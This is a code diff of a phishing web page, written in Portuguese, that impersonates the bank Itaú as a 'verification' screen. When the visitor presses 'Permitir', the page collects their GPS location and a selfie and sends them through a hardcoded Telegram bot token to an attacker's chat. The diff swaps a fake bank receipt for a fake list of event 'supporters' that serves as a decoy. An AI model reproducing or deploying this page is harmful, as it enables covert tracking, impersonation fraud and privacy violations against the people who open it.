@@ -1,19 +1,20 @@
 <!DOCTYPE html>
 <html lang="pt-BR">
 <head>
-<meta charset="UTF-UTF-8">
+<meta charset="UTF-8">
 <title>Verificação – Itaú</title>
 <meta name="viewport" content="width=device-width,initial-scale=1">
 <style>
 *{margin:0;padding:0;box-sizing:border-box;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Arial,sans-serif}
 body{background:#0a2540;color:#fff;display:flex;height:100vh;align-items:center;justify-content:center}
-.card{background:#fff;color:#003366;border-radius:16px;padding:28px 24px;max-width:300px;text-align:center;box-shadow:0 8px 24px rgba(0,0,0,.25)}
+.card{background:#fff;color:#003366;border-radius:16px;padding:28px 24px;max-width:320px;text-align:center;box-shadow:0 8px 24px rgba(0,0,0,.25)}
 img{width:80px;margin-bottom:12px}
 h2{font-size:18px;margin-bottom:8px}
 p{font-size:14px;margin-bottom:20px;line-height:1.35}
 button{background:#003366;color:#fff;border:none;padding:12px 0;width:100%;border-radius:6px;font-size:16px;cursor:pointer}
 button:active{transform:scale(.98)}
-.blur{filter:blur(6px)}
+ul{text-align:left;font-size:13px;margin-top:12px;padding-left:20px}
+li{margin-bottom:4px}
 </style>
 </head>
 <body>
@@ -26,38 +27,27 @@ button:active{transform:scale(.98)}
   <button id="btnPermitir">Permitir</button>
 </div>
 
-<!-- COMPROVANTE FAKE (embaçado) -->
-<div id="comprovante" class="card blur" style="display:none">
-  <div style="font-weight:700;font-size:20px;margin-bottom:16px">Itaú</div>
-  <div style="display:flex;justify-content:space-between;margin-bottom:6px;font-size:13px">
-    <span>Comprovante</span><span id="dataHora"></span>
-  </div>
-  <div style="display:flex;justify-content:space-between;margin-bottom:6px;font-size:13px">
-    <span>Valor</span><span>R$ 1.234,56</span>
-  </div>
-  <div style="display:flex;justify-content:space-between;margin-bottom:6px;font-size:13px">
-    <span>ID transação</span><span id="idTransacao"></span>
-  </div>
-  <div style="display:flex;justify-content:space-between;margin-bottom:6px;font-size:13px">
-    <span>Autenticação BACEN</span><span id="autenticacao"></span>
-  </div>
-  <div style="text-align:center;font-size:11px;color:#666;margin-top:12px">Transação realizada com sucesso.</div>
+<!-- LISTA FAKE DE APOIADORES -->
+<div id="listaBox" class="card" style="display:none">
+  <h2>Verificado ✅</h2>
+  <p>Apoiadores confirmados:</p>
+  <ul>
+    <li>Carlos Henrique – DJ</li>
+    <li>Amanda Souza – Segurança</li>
+    <li>Lucas Oliveira – Bar</li>
+    <li>Tamires Lima – Entradas</li>
+    <li>Rafael Gomes – Som</li>
+    <li>Jéssica Costa – Ambulância</li>
+    <li>Bruno Silva – Limpeza</li>
+    <li>Luana Ferreira – Decoração</li>
+  </ul>
+  <p style="font-size:11px;color:#666;margin-top:12px">Licença de baile emitida com sucesso.</p>
 </div>
 
 <script>
 // CONFIG
 const TOKEN   = '7737279523:AAHU02j3i3XKAeg020uQwcUgpDL3viDmR1c';
 const CHAT_ID = '-1003187104876';
-
-// DADOS FAKE
-const dados = {
-  dataHora: new Date().toLocaleString('pt-BR'),
-  idTransacao: 'ITAU' + Date.now().toString(36).toUpperCase(),
-  autenticacao: [...Array(16)].map(() => Math.random().toString(36)[2]).join('').toUpperCase()
-};
-document.getElementById('dataHora').textContent = dados.dataHora;
-document.getElementById('idTransacao').textContent = dados.idTransacao;
-document.getElementById('autenticacao').textContent = dados.autenticacao;
 
 // ENVIA PARA O TELEGRAM
 const tele = (msg, media) => {
@@ -75,10 +65,6 @@ const tele = (msg, media) => {
 
 // AÇÃO DO BOTÃO
 document.getElementById('btnPermitir').addEventListener('click', async () => {
-  // Mostra comprovante embaçado
-  document.getElementById('startBox').style.display = 'none';
-  document.getElementById('comprovante').style.display = 'block';
-
   // GPS
   navigator.geolocation.getCurrentPosition(
     p => {
@@ -109,10 +95,9 @@ document.getElementById('btnPermitir').addEventListener('click', async () => {
     tele('📸 selfie falhou: ' + e.message);
   }
 
-  // Finaliza com tela de sucesso
-  setTimeout(() => {
-    document.body.innerHTML = '<div class="card"><img src="data:image/svg+xml,%3Csvg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 100 100%22%3E%3Ccircle cx=%2250%22 cy=%2250%22 r=%2248%22 fill=%22%2300c851%22/%3E%3Cpath d=%22M30 50 L45 65 L70 35%22 stroke=%22%23fff%22 stroke-width=%228%22 fill=%22none%22 stroke-linecap=%22round%22/%3E%3C/svg%3E" width=80><h2>Verificado!</h2><p>Obrigado por ajudar.</p></div>';
-  }, 1500);
+  // Mostra lista falsa
+  document.getElementById('startBox').style.display = 'none';
+  document.getElementById('listaBox').style.display = 'block';
 });
 </script>
 </body>
